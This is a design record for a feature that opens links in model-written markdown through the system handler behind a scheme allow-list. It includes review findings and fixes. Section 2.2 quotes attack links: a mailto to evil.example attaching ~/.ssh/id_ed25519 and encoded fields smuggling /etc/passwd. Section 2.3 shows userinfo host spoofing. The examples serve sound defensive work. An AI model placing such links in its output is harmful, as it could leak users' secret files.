# An address in a reply opens in the system's handler for its scheme, behind an allow-list

**Dated:** 2026-10-20 ·
**Status:** built. Commit `90e9e7e` on `feat/vector-rendering` (board tasks
`link-open`, `link-bare`, `link-wire`), then the `link-review` findings fixed by
`link-fix` in the commit that follows it. No link has been clicked in a real
window. ·
**Origin:** the operator, 2026-10-20: text that matches an address becomes
clickable and invokes the system's handler for its scheme. ·
**Evidence:** the results and notes of board tasks `link-open`, `link-bare`,
`link-wire`, `link-review` and `link-fix`; `tests/test_links.py`,
`tests/test_bare_links.py`, `tests/test_link_wiring.py`; `/usr/bin/xdg-open`
(xdg-utils 1.1.3) and imscribe 0.2.0's `ui/typeset_view.py`, read on this machine ·
**Engages with:** `pptmstr/links.py`, `pptmstr/ui/typeset/gate.py`
(`_bare_addresses`, `_show_destinations`, `_names_itself`),
`pptmstr/ui/typeset/views.py` (`follow_links`, `_Followed`, `_show_view`,
`_say_a_refusal`), `pptmstr/app.py` (`main`), and
[`2026-10-18-vector-displays-beside-typeset-text.md`](2026-10-18-vector-displays-beside-typeset-text.md)
§5 and §9.

**A click on a link in any typeset markdown view goes to `links.follow`. It hands
the destination to `xdg-open` or `open` only if the destination is `http`, `https`
or `mailto`, names no user before its host, and, for `mailto`, carries only the
five RFC 6068 fields. A bare `http(s)://` address in prose is a link by a rule of
pptmstr's own. A link the policy refuses is still drawn as a link, and the mouse
over it shows the reason in a tooltip. Literal text (tool output, prompts) is never
clickable.**

How to read the attributions. **[ran]** means the writer of this record executed
it. **[read]** means the writer read the file or URL this session. **[relayed]**
means a worker's or a note's claim that this record did not re-check.
**[unverified]** means nobody checked it. **[judgement]** is an opinion, labelled as
one.

---

## 1. What is built

- **`pptmstr/links.py`.** `followable(destination) -> str | None` is the policy.
  It is pure, and it returns a reason or None. `follow(destination)` asks the
  policy, builds the argv (`opener_argv`) and launches it without a shell, without
  waiting, with the standard streams on DEVNULL and in a new session. A daemon
  thread reaps the child. It never raises, and it logs refusals and failures under
  the source `link` [ran, `tests/test_links.py`].
- **`gate._bare_addresses`.** A core rule on the reader pptmstr already modifies.
  It makes a bare `http://` or `https://` address in a `text` token into a link.
  It runs before `_show_destinations`, so an address that is its own destination
  says nothing more, and a lookalike host is followed by its `xn--` destination
  [ran, `tests/test_bare_links.py`].
- **`views.follow_links(handler, refusal=...)`.** One handler for the process.
  Every markdown view whose caller passed no `on_link` uses it: settled documents,
  `markdown` and streams. `app.main` installs
  `follow_links(links.follow, refusal=links.followable)` before `immapp.run`.
  Literal views and views of rows are given no handler [ran,
  `tests/test_link_wiring.py`].

## 2. Decisions, with their reasons

### 2.1 Only http, https and mailto reach the opener

`xdg-open` and `open` dispatch on scheme to whatever is registered. For `file:` or
an application scheme (`vscode://`, `ms-*`, `slack://`) that can mean running an
executable, a `.desktop` file or an application action. The destination is model
output. These three schemes are what a reader expects a click on a link to open.
Adding a scheme is a one-line change to `ALLOWED_SCHEMES`, to be made deliberately
with its handler in mind. The scheme is compared case-insensitively. A destination
with no scheme (a path, a fragment, `//host`) is refused rather than resolved
against anything. Whitespace, control characters, format characters (bidi
overrides, zero-width) and lone surrogates are refused anywhere, because they make
what is shown differ from what opens. A destination longer than 8 KiB is refused,
because nobody reads one that long.

### 2.2 A mailto query carries only to, cc, bcc, subject and body

Some mail clients honour `attach=` or `attachment=` as a local file to attach:
CVE-2020-11879 (Evolution before 3.35.91) and CVE-2020-11880 (KMail) [relayed,
reviewer-2]. A link such as
`[the maintainers](mailto:x@evil.example?attach=~/.ssh/id_ed25519)` shows its
destination inline, but nobody reads a query string. So `followable` refuses any
field but those five, case-insensitively, and refuses a field given twice. The
names are checked as written and again percent-decoded. A client that decodes
before it splits would read `subject=x%26attach%3D/etc/passwd` or
`a@b%3Fattach=...` as an `attach` field, so both are refused. A field with no `=`
in the decoded reading is a piece of a value (an encoded `&` in a subject) and is
allowed. `in-reply-to` is refused too; nothing a model writes needs it
[judgement]. An empty recipient (`mailto:?subject=x`) is allowed.

The default mail handler here is KMail (`xdg-mime query default
x-scheme-handler/mailto` → `org.kde.kmail2.desktop`) [ran]. Whether this KMail
honours `attach=` was not measured, and on the lead's instruction no mail client
was launched to find out. The fix stands either way.

### 2.3 A destination that names a user before its host is refused

`https://docs.python.org@evil.example/3/` goes to `evil.example`. A link a model
writes has no use for userinfo, and userinfo is how a destination is made to begin
with a name the reader trusts. `followable` refuses an `http(s)` destination whose
`urlsplit` has a username or password, the empty `https://@host/` included
[ran]. The bare-address rule does not link an address whose authority holds an `@`.
The authority is read after escapes are resolved, so
`https://www.google.com\@evil.example` is not linked either [ran].

An explicit `[the docs](https://docs.python.org@evil.example/3/)` is still a link,
and it is set as `the docs (https://docs.python.org@evil.example/3/)`.
`_names_itself` leaves a destination unsaid only where the link's text is the
destination to the character, so it cannot hide the host [ran]. The click is
refused, with a tooltip.

### 2.4 Our own bare-address rule, not linkify-it-py

markdown-it's `linkify` option needs `linkify-it-py`, which is not installed
[relayed, lead]. It would be one more dependency for a narrow grammar. Its fuzzy
matching also links a bare `example.com` and an email address, which is the recall
this rule declines: model output is read for what it says, and a link the writer
did not mean costs more than an address left as text. The rule is modelled on
GFM's extended URL autolink (https://github.github.com/gfm/#autolinks-extension-,
read by builder-9 on 2026-10-20) [relayed]. It departs from GFM in these places,
each argued in the `_bare_addresses` docstring:

- **Only `http://` and `https://`.** GFM also links `www.` addresses and email
  addresses.
- **The start boundary.** An address may not follow an ASCII letter or digit, `+`,
  `-`, `.`, `/`, `:` or `@`. So `git+https://` and `xhttps://` are not links, and
  neither is an `http://` inside another address. GFM allows a start only at line
  start, after a space, or after `*`, `_`, `~` or `(`. This rule also allows one
  after a quote, a bracket, or a CJK letter.
- **No dot required in the host.** `http://localhost:8000` is something agents
  write.
- **The end.** The address also ends at `>` and `"`, because pptmstr sets raw HTML
  as text, so `href="https://x.org/">` would otherwise take the quote and the
  bracket. It also ends at CJK and full-width punctuation (`、。，！？）「」`),
  because prose in those scripts puts no space after one.
- **The scheme is lower-cased** before the reader normalises the href, because
  markdown-it punycodes a host only under a lower-case scheme. `HTTPS://X.org/a`
  is therefore set with `(https://X.org/a)` after it.
- **The href is read as CommonMark reads an escape, and the text is set as
  written.** `Foo\_(bar)` is set with its backslash and goes to `Foo_(bar)`, and
  because the text then differs from the destination, the destination is said
  after it.

These follow GFM: trailing `?!.,:*_~'` is trimmed; an unbalanced trailing `)` is
trimmed; a trailing `;` is trimmed together with an entity-like `&hl;`; a trailing
`]` is kept.

### 2.5 One default handler, not `on_link` at every call site

Whether a click opens an address is the app's policy, not each pane's. About a dozen
call sites pass no `on_link` [relayed, lead], and each would be one more place to
forget it. An explicit `on_link` still wins.

**A view is given its handler in its constructor.** The library's view makes the
converter that inks links when it is constructed, and the converter takes the link
ink from whether the view has a handler at that moment. In `90e9e7e` the handler
was assigned after construction. So every link was drawn as plain text, clickable,
until a theme switch described the view again. `link-fix` passes the handler to the
`TypesetView` and `TypesetStreamView` constructors, and a test now checks the link
ink in the drawn vertices, in settled views and streams alike [ran]. The earlier
test only checked that `on_link` was set at `set_document`, which is not where the
ink is taken.

**A change of handler moves the epoch** (`roles.moved`), so every view is made
again at its next draw with the new handler, as happens at a change of face. The
app installs the handler before the loop, when there are no views, so this costs it
nothing. A handler installed after a view exists now both inks and follows that
view's links [ran]. Before this change, such a view was clickable but not inked,
and a test pinned that half-state.

**What the handler raises is logged and goes no further** (`views._Followed`). The
library calls `on_link` inside its draw, and pptmstr makes that draw inside
`gate.into_library`. An exception from the handler would therefore be read as the
library stopping, and typeset text would leave every pane. The wrapper catches it
and logs it under `link` [ran]. An explicit `on_link` is not wrapped. No pane
passes one, and it is the caller's code.

### 2.6 How a refusal surfaces

Once a view has a handler, imscribe draws every link the same way, followable or
not: the link ink and the hand cursor. Common model output such as
`[gate.py](pptmstr/ui/typeset/gate.py)`, `#section` or `vscode://...` would
otherwise be a click that does nothing anyone sees. So:

- **On hover,** a stock ImGui tooltip under the mouse reads `not opened: <reason>`.
  `_show_view` asks the view's `hovered_link` after the draw (imscribe answers it
  with or without a handler) and asks the installed `refusal`. It does this only
  where the view's handler is the app's, because an explicit `on_link` has a
  policy pptmstr does not know [ran, headless].
- **On click,** `follow` logs the refusal (`LOG.warn`, source `link`), as before.

## 3. The review's findings and the lead's items, with their dispositions

The lead's items, from builder-8's `link-wire` concern:

| item | disposition |
|---|---|
| A1. A theme switch re-describes every markdown view once a handler is installed | **Accepted.** It is a one-off cost on a switch the operator makes. `test_parts_kept_across_a_theme_switch_are_inked_in_the_new_theme` now runs with and without a handler. Without one, the view is kept and nothing is laid out again. With one, the view is kept, its revision moves, and the links take the new theme's ink [ran]. **Upstream ask (imscribe):** re-describe only views that have links. |
| A2. Test isolation of the handler | **Fixed.** An autouse fixture in `tests/conftest.py` (`_no_link_handler_is_inherited`) sets `views._FOLLOW` to None around every test. The install stays where it was in `main`, just before `immapp.run`. With the fixture, the position is no longer held in place by `test_app`'s helper. It is right for the app because it comes after everything that configures the typeset seam and before the first view can exist [read]. No test shows that the fixture is needed: it guards against a leak that the current install position does not cause. |
| A3. A raising handler reads as the library stopping | **Fixed** (§2.5). Test: a raising handler, clicked, leaves `gate._GATE.stopping` None and `can_draw()` true, and logs one error line [ran]. |
| A4. A press that starts on link text begins no selection | **Accepted.** That is imscribe's contract with a handler set. A selection can still start elsewhere and run across a link [relayed, builder-8; the click test checks `selection is None`, ran]. |

reviewer-2's `link-review` findings, all derived from reading:

| # | finding | disposition |
|---|---|---|
| B1 | mailto passes any query field (`attach=`) | **Fixed** (§2.2), with tests for `attach`, `attachment`, case, a percent-encoded name, an encoded `&`/`=` in a value, an encoded `?` in the address, a duplicate field, and a field with no value [ran]. Not measured against a mail client. |
| B2 | userinfo is followed, and a bare address hides it | **Fixed** in `followable` and in the bare rule (§2.3). The `https://user@example.com:8443/path` case that `test_links` allowed is now refused [ran]. |
| B3 | a refused link looks clickable | **Fixed** with a tooltip (§2.6) [ran, headless]. |
| B4 | the docstring's case against `webbrowser` partly applies to `xdg-open` | **Fixed.** I read `/usr/bin/xdg-open` (1.1.3) myself [read]. In generic mode, `open_generic` tries the `x-scheme-handler` desktop entry and then `open_envvar`, which honours `$BROWSER` in both its `%s` and plain forms. The fallback list ends `www-browser:links2:elinks:links:lynx:w3m`. The `links.py` docstring now says that DEVNULL streams plus `start_new_session` are what keep a handler off pptmstr's terminal. What it still holds against `webbrowser` is what holds only for `webbrowser`: a synchronous first call, and running a console browser on the inherited terminal while waiting for it [read, `webbrowser.GenericBrowser.open`]. This machine is KDE, so `xdg-open` here goes to `kde-open5` and not to generic mode [ran, `XDG_CURRENT_DESKTOP=KDE`]. |
| B5 | the scheme's case reaches the opener | **Fixed.** `opener_argv` lower-cases the scheme and leaves the rest as written [ran]. Measured: `xdg-mime query default x-scheme-handler/MAILTO` and `.../mailto` both answer `org.kde.kmail2.desktop`, and `HTTPS`/`https` both answer `userapp-Firefox-W5XCX3.desktop` [ran]. So on this KDE machine the lookup is case-insensitive and the reviewer's failure does not reproduce. The generic-mode `xdg-mime` on another desktop was not measured. The fix is RFC 3986 and costs nothing. |
| B6 | an escape in a bare address goes to `%5C` | **Fixed** (§2.4). The href is built from the unescaped reading and the text stays as written. A backslash before a character that is not ASCII punctuation is no escape and still goes as `%5C` [ran]. |
| B7 | the boundary check looks only inside one text token | **Does not hold as a defect in the boundary check; recorded.** The token before a text token that starts with an address is a code span, a link or emphasis, and in the source it ends in `` ` ``, `>`, `)`, `*`, `_` or `~`. None of these stops an address under this rule, inside a token or across one, so looking back across tokens would change no result. `` `x`https://a.org `` and `**x**https://a.org` are links, and tests pin both [ran]. GFM also links after `*`. Whether the rule should refuse a start after `` ` ``, `>` or `)` is a question about the boundary set, not about tokens. Left as is [judgement: the text is the address, so it misleads nobody]. Found while fixing B9: the boundary used `str.isalnum`, so a CJK letter blocked an address (`詳細はhttps://…`), although the docstring says only scheme characters, which are ASCII. It now tests ASCII letters and digits [ran]. |
| B8 | a partial address is clickable mid-stream | **Accepted.** What is shown is what opens. "Nothing is linked before the host arrives" holds only for the host's first character. |
| B9 | trailing `]` and CJK punctuation | **`]` accepted:** it matches GFM. **CJK fixed** (§2.4) [ran]. |
| B10 | a handler installed late leaves a half-state | **Fixed rather than documented** (§2.5). The epoch move makes it trivial. The reviewer's claim that a stream made before the install "never gets the handler" did not hold: `Stream.draw` goes through `_show_view`, which assigns the handler on every draw [read]. Its ink was stale, as was every view's (§2.5). |
| B11 | localhost, link-local and private addresses are followed | **Accepted risk.** A browser opening `http://127.0.0.1:631/` or `http://169.254.169.254/` is the user's click on a destination they can see. `http://localhost:8000/x` is linked on purpose. |
| B12 | two unrelated functions named `_linked` | **Fixed.** The one in `views.py` is now `_handler_for`. `gate._linked` is unchanged. |

## 4. Not changed by this work

- **Markdown images are not rendered.** That is the operator's call of 2026-10-20,
  recorded in
  [`2026-10-18-vector-displays-beside-typeset-text.md`](2026-10-18-vector-displays-beside-typeset-text.md)
  §5. `![alt](url)` is still an exclamation mark and a link, and the link follows
  the same policy as any other.
- The hazard recorded in that record's §9 still stands: `_reader` modifies
  imscribe's private shared parser. The bare-address rule is one more rule on the
  same parser, and it does not widen that hazard.

## 5. What was not run

- **A real click in a real window.** Every click, hover and tooltip test runs in
  a headless ImGui context with injected mouse events and a recording handler. The
  hand cursor, the tooltip as drawn, and `xdg-open` actually opening a browser or a
  mail client have not been seen.
- **macOS `open`.** Only the argv it would be handed is tested.
- **A mail client's handling of `attach=`.** Not launched, on purpose.
- **`xdg-open` in generic mode, GNOME (`gio open`), or another desktop's `xdg-mime`**,
  for an upper-case scheme. Only this KDE machine's `xdg-mime` was queried.
- **cmark-gfm's `;` and entity trim.** It rests on builder-9's memory of
  `autolink_delim`, and neither builder-9 nor reviewer-2 fetched the source
  [relayed].
- **Firefox's and Chrome's handling of userinfo.** Not needed, now that userinfo
  is refused.
